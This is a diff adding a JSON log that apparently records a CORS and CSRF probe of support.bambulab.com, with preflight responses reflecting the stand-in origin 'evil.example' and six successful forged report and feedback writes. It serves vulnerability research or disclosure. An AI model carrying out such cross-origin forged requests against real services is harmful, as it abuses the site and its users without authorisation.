@@ -1,0 +1,72 @@
+{
+  "base": "https://support.bambulab.com",
+  "timestamp": "2026-11-16T13:42:23.204Z",
+  "hypothesis": "A malicious origin can submit report/feedback writes with arbitrary userId because CORS reflects its origin and no CSRF token is required.",
+  "preflight": {
+    "report": {
+      "status": 200,
+      "allowOrigin": "https://evil.example",
+      "allowCredentials": "true",
+      "allowMethods": "POST",
+      "allowHeaders": "content-type"
+    },
+    "feedback": {
+      "status": 200,
+      "allowOrigin": "https://evil.example",
+      "allowCredentials": "true",
+      "allowMethods": "POST",
+      "allowHeaders": "content-type"
+    }
+  },
+  "report": [
+    {
+      "trial": 1,
+      "marker": "CSRF-BE3DC5",
+      "status": 200,
+      "dataTrue": true,
+      "response": "{\"code\":\"000000\",\"msg\":\"操作成功\",\"traceId\":\"2a5bdb1bd9524fed94c3fd6ec7d202eb.513.17948365439012011\",\"data\":true}"
+    },
+    {
+      "trial": 2,
+      "marker": "CSRF-1C32BF",
+      "status": 200,
+      "dataTrue": true,
+      "response": "{\"code\":\"000000\",\"msg\":\"操作成功\",\"traceId\":\"db04e1af211d4a89b54bacc46dba73fb.515.17948365449152055\",\"data\":true}"
+    },
+    {
+      "trial": 3,
+      "marker": "CSRF-5A198C",
+      "status": 200,
+      "dataTrue": true,
+      "response": "{\"code\":\"000000\",\"msg\":\"操作成功\",\"traceId\":\"db04e1af211d4a89b54bacc46dba73fb.517.17948365459722051\",\"data\":true}"
+    }
+  ],
+  "feedback": [
+    {
+      "trial": 1,
+      "marker": "CSRF-ABB1A1",
+      "status": 200,
+      "dataTrue": true,
+      "response": "{\"code\":\"000000\",\"msg\":\"操作成功\",\"traceId\":\"2a5bdb1bd9524fed94c3fd6ec7d202eb.522.17948365467582009\",\"data\":true}"
+    },
+    {
+      "trial": 2,
+      "marker": "CSRF-1DA24F",
+      "status": 200,
+      "dataTrue": true,
+      "response": "{\"code\":\"000000\",\"msg\":\"操作成功\",\"traceId\":\"1e911c5eb0984ca392b5f15b4452fcc3.514.17948365476422065\",\"data\":true}"
+    },
+    {
+      "trial": 3,
+      "marker": "CSRF-A239D3",
+      "status": 200,
+      "dataTrue": true,
+      "response": "{\"code\":\"000000\",\"msg\":\"操作成功\",\"traceId\":\"1e911c5eb0984ca392b5f15b4452fcc3.513.17948365485972063\",\"data\":true}"
+    }
+  ],
+  "summary": {
+    "report": "3/3",
+    "feedback": "3/3",
+    "victimUuidRequired": false
+  }
+}
